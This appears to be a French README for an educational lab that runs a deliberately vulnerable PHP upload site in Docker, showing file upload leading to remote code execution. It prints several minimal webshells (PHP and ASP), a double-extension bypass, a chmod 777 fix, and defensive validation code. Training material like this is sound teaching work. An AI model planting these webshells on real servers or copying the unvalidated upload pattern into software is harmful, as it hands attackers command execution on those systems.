# Lab DIABLE - File Upload to RCE

**Version:** 1.0  
**Auteur:** [Hamed]  
**Tag:** WEB  
**Difficulté:** Moyen

---

## 📖 Description

Ce laboratoire démontre une vulnérabilité de type "File Upload" permettant d'exécuter du code arbitraire à distance (RCE). L'application simule un site de partage de photos de voyage qui ne vérifie pas les fichiers uploadés, permettant à un attaquant d'uploader un webshell et de prendre le contrôle du serveur.

---

## 🎯 Objectifs pédagogiques

- Comprendre le mécanisme d'une attaque File Upload
- Créer et utiliser un webshell simple
- Visualiser l'impact d'un RCE (Remote Code Execution)
- Apprendre les bonnes pratiques de validation des fichiers

---

## 🚀 Installation et démarrage

### Prérequis

- Docker Desktop ou Docker Engine
- Git
- Navigateur web

### Démarrage rapide

```bash
# Depuis la racine du projet DIABLE
cd attacks/file-upload-lab
docker build -t diable/file-upload-lab .
docker run -d -p 8082:80 --name file-upload-lab diable/file-upload-lab
```

Accéder au lab: http://localhost:8082

### Build manuel

```bash
docker build -t diable/file-upload-lab .
docker run -d -p 8082:80 --name file-upload-lab diable/file-upload-lab
```

---

## 📂 Structure du projet

```
file-upload-lab/
├── Dockerfile
├── README.md
└── src/
    ├── index.php
    ├── style.css
    ├── health.php
    ├── reset.php
    └── uploads/          (dossier pour les fichiers uploadés)
```

---

## 🎮 Scénarios disponibles

### Scénario 1: Upload simple d'un webshell

**Objectif:** Uploader un fichier PHP malveillant et exécuter des commandes

**Cible:** Formulaire d'upload sur la page d'accueil

**Technique:** Création d'un fichier `shell.php` contenant:

```php
<?php system($_GET['cmd']); ?>
```

**Payload:** Uploader le fichier via le formulaire

**Résultat:** Accès à l'URL `http://localhost:8082/uploads/shell.php?cmd=id` qui affiche les informations de l'utilisateur du serveur

### Scénario 2: Contournement basique (à développer)

**Objectif:** Contourner une éventuelle vérification d'extension

**Technique:** Double extension (`shell.php.jpg`)

---

## 🔧 Commandes utiles

```bash
# Voir les logs
docker logs -f file-upload-lab

# Arrêter le conteneur
docker stop file-upload-lab

# Redémarrer le conteneur
docker start file-upload-lab

# Supprimer le conteneur
docker rm file-upload-lab

# Reset (quand implémenté)
curl http://localhost:8082/reset.php

# Health check
curl http://localhost:8082/health.php
```

---

## 🛡️ Mesures de protection

### 1. Validation du type MIME

```php
$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($_FILES['file']['type'], $allowed_types)) {
    die("Type de fichier non autorisé");
}
```

### 2. Vérification de l'extension

```php
$extension = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
$allowed_ext = ['jpg', 'jpeg', 'png', 'gif'];
if (!in_array(strtolower($extension), $allowed_ext)) {
    die("Extension non autorisée");
}
```

### 3. Stockage hors du dossier web

```php
// Stocker les fichiers en dehors de la racine web
$target_dir = "/var/www/uploads/";
// et servir via un script de téléchargement sécurisé
```

---

## ❓ Dépannage

### Problème: Le fichier uploadé ne s'affiche pas
**Solution:** Vérifier les permissions du dossier uploads

```bash
docker exec file-upload-lab chmod 777 /var/www/html/uploads
```

### Problème: Erreur "403 Forbidden" sur le shell
**Solution:** Vérifier que les fichiers PHP sont autorisés dans le dossier uploads

### Problème: Le health check échoue
**Solution:** Vérifier que le fichier health.php existe et est accessible

---

## 📊 Comptes de test

Aucun compte requis pour ce lab.

---

## 📚 Théorie: File Upload to RCE

### Principe
L'attaque "File Upload" exploite l'absence de validation des fichiers téléchargés par les utilisateurs. Un attaquant peut uploader un script malveillant (webshell) qui, une fois exécuté sur le serveur, lui permet de:

1. Exécuter des commandes système
2. Lire/écrire des fichiers sensibles
3. Accéder à la base de données
4. Utiliser le serveur comme point d'entrée pour d'autres attaques

### Types de webshells courants

**PHP:**
```php
<?php system($_GET['cmd']); ?>
```

**PHP plus complet:**
```php
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

**ASP:**
```asp
<% eval Request("cmd") %>
```

---

## ✍️ Auteur

**[Hamed]**  
DSI ISFA 2025-2026

---

## 📅 Historique

| Version | Date | Auteur | Modifications |
|---------|------|--------|---------------|
| 1.0 | 26/02/2026 | [Hamed] | Version initiale |

---

## ⚠️ Avertissement

Ce laboratoire contient des vulnérabilités intentionnelles à des fins pédagogiques dans le cadre du projet DIABLE v3.0 (DSI ISFA 2025-2026). Ne JAMAIS déployer en production ou sur des systèmes réels sans autorisation.
